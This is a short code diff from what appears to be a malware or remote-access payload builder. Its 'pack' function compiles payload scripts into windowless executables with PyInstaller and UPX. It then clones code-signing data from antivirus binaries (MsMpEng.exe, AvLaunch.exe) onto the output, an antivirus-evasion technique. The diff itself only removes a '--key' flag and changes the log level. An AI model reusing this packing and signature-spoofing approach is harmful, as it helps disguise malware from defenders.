@@ -116,7 +116,7 @@ def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', i
 		current_path = abspath(__file__)
 		father_path = abspath(dirname(current_path) + sep + ".")
 		f_father_path = abspath(dirname(father_path) + sep + ".")
-		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} --key {key} -w --log-level CRITICAL"
+		command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/payload.py {upx_command} -w --log-level FATAL"
 		command_sign_1 = f"python {father_path}/sign.py -i {father_path}/sign_sample/MsMpEng.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign.exe"
 		command_sign_2 = f"python {father_path}/sign.py -i {father_path}/sign_sample/AvLaunch.exe -t {father_path}/upload_payload/PINGPONG_payload.exe -o {father_path}/upload_payload/PINGPONG_payload_sign_twice.exe"
 
@@ -149,7 +149,7 @@ def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', i
 			if not is_basic_payload:
 				if isfile("payload.exe"):
 					remove("payload.exe")
-				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} --key {key} -w --log-level CRITICAL"
+				basic_command = f"pyinstaller -p {install_path}/Lib/site-packages -F payload/_basic_conn_tmp.py {upx_command} -w --log-level FATAL"
 				with open('payload/_basic_conn.py', 'r') as p:
 					basic_pay = p.read()
 				with open('payload/_basic_conn_tmp.py', 'w') as a:
